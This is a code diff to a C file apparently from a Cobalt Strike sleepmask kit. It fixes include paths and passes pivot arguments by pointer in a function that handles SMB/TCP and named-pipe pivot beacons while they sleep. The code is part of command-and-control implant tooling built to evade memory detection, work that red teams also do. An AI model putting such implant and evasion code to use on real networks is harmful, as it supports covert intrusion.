@@ -1,10 +1,13 @@
 #include <windows.h>
 
-#include "../beacon.h"
-#include "../base/helpers.h"
-#include "../sleepmask.h"
-#include "../sleepmask-vs.h"
-#include "../debug.h"
+// Include bof-vs header files
+#include "beacon.h"
+#include "helpers.h"
+#include "sleepmask.h"
+
+// Include sleepmask-vs specific header files
+#include "..\debug.h"
+#include "..\sleepmask-vs.h"
 
 /**
 * SMB/TCP Beacon sleep
@@ -25,25 +28,25 @@ void PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
 
     // Create new variables for readability
     PIVOT_ACTION action = info->pivot_args.action;
-    PIVOT_ARGS pivotArguments = info->pivot_args;
+    PPIVOT_ARGS pivotArguments = &info->pivot_args;
 
     // Check whether the Beacon is an extc2-loader Beacon
     EXTC2_DLL_STATE externalC2Dll = GetExternalC2DllState(info, customUserData);
 
     if (action == ACTION_TCP_ACCEPT) {
         // Accept a socket
-        pivotArguments.out = accept(pivotArguments.in, NULL, NULL);
+        pivotArguments->out = accept(pivotArguments->in, NULL, NULL);
     }
     else if (action == ACTION_TCP_RECV) {
         // Block until data is available 
-        recv(pivotArguments.in, (char*)&(pivotArguments.out), 1, MSG_PEEK);
+        recv(pivotArguments->in, (char*)&(pivotArguments->out), 1, MSG_PEEK);
     }
     else if (action == ACTION_PIPE_WAIT) {
         BOOL fConnected = 0;
 
-        // Change the pipe to NOWAIT state
+        // Change the pipe to NOWAIT state.
         DWORD mode = PIPE_READMODE_BYTE | PIPE_NOWAIT;
-        if (!SetNamedPipeHandleState(pivotArguments.pipe, &mode, NULL, NULL)) {
+        if (!SetNamedPipeHandleState(pivotArguments->pipe, &mode, NULL, NULL)) {
             return;
         }
         // Wait for a connection to the pipe
@@ -51,12 +54,12 @@ void PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
         while (!fConnected) {
             // Small sleep before trying to connect
             Sleep(1000);
-            fConnected = ConnectNamedPipe(pivotArguments.pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);   
+            fConnected = ConnectNamedPipe(pivotArguments->pipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);   
         }
 
         // Change the pipe back to blocking mode
         mode = PIPE_READMODE_BYTE;
-        if (!SetNamedPipeHandleState(pivotArguments.pipe, &mode, NULL, NULL)) {
+        if (!SetNamedPipeHandleState(pivotArguments->pipe, &mode, NULL, NULL)) {
            return;
         }
     }
@@ -65,7 +68,7 @@ void PivotSleep(PSLEEPMASK_INFO info, PCUSTOM_USER_DATA customUserData) {
 
             // Wait for data to be available on our pipe.
             while (TRUE) {
-                if (!PeekNamedPipe(pivotArguments.pipe, NULL, 0, NULL, &dataAvailable, NULL)) {
+                if (!PeekNamedPipe(pivotArguments->pipe, NULL, 0, NULL, &dataAvailable, NULL)) {
                     break;
                 }
 
